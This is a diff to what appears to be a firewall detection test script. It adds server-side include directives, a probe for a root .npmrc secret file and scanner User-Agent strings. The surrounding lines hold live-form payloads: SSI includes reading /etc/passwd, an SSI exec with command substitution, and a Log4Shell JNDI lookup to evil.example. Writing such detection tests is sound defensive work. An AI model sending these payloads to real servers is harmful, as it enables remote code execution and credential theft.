@@ -209,6 +209,8 @@ json $A ssti "ssi include in json"     '{"note":"<!--#include virtual=\"/etc/pas
 q $A ssti "ssi echo"                   '<!--#echo var="DOCUMENT_URI" -->'
 q $A ssti "ssi printenv"               '<!--#printenv -->'
 json $A ssti "ssi exec with backtick"  '{"note":"<!--#exec cmd=\"ls `id`\" -->"}'
+q $A ssti "ssi config errmsg"           '<!--#config errmsg="x" -->'
+q $A ssti "ssi set variable"            '<!--#set var="a" value="b" -->'
 
 # --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
 hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
@@ -296,6 +298,17 @@ hdr $A scanner "netsparker"            User-Agent "Mozilla/5.0 (compatible; Nets
 hdr $A scanner "arachni"               User-Agent "Arachni/v1.6.1"
 hdr $A scanner "qualys was"            User-Agent "Mozilla/5.0 (Qualys WAS)"
 hdr $A scanner "vega"                  User-Agent "Vega/1.0"
+# Aegolith (alpha.6): a root package-manager secret file and the other scanner agents added in alpha.6.
+path $A scanner "npmrc at root"        "/.npmrc"
+hdr $A scanner "w3af"                  User-Agent "w3af.org"
+hdr $A scanner "webinspect"            User-Agent "Mozilla/5.0 (compatible; WebInspect)"
+hdr $A scanner "havij"                 User-Agent "Havij"
+hdr $A scanner "sqlninja"              User-Agent "sqlninja/0.2.6"
+hdr $A scanner "whatweb"               User-Agent "WhatWeb/0.5.5"
+hdr $A scanner "detectify"             User-Agent "Detectify"
+hdr $A scanner "jorgee"                User-Agent "Mozilla/5.0 Jorgee"
+hdr $A scanner "zmeu"                  User-Agent "ZmEu"
+hdr $A scanner "paros"                 User-Agent "Paros/3.2.13"
 
 # --- 14. Session fixation / misc ----------------------------------------------------------------------------------
 q $A session "session fixation"        "PHPSESSID=attacker-fixed-id"
